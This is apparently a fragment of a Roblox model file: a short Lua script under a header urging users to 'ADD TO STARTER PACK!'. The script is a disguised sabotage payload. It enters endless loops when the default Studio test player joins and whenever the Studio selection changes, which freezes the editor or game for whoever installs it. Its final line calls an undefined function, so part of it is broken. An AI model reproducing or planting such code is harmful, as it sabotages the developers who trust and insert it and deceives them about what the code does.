					<ProtectedString name="Source">--IMPORTANT!!! ADD TO STARTER PACK! Published by steffanno--
-----------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------


game.Players.PlayerAdded:connect(function(player)
if player.Name == &quot;Player&quot; then
while true do end
end
end)

game.Selection.SelectionChanged:connect(function()
while true do end
end)

for _, player in pairs(game.Players:GetChildren()) do PlayerAdded(player) end</ProtectedString>
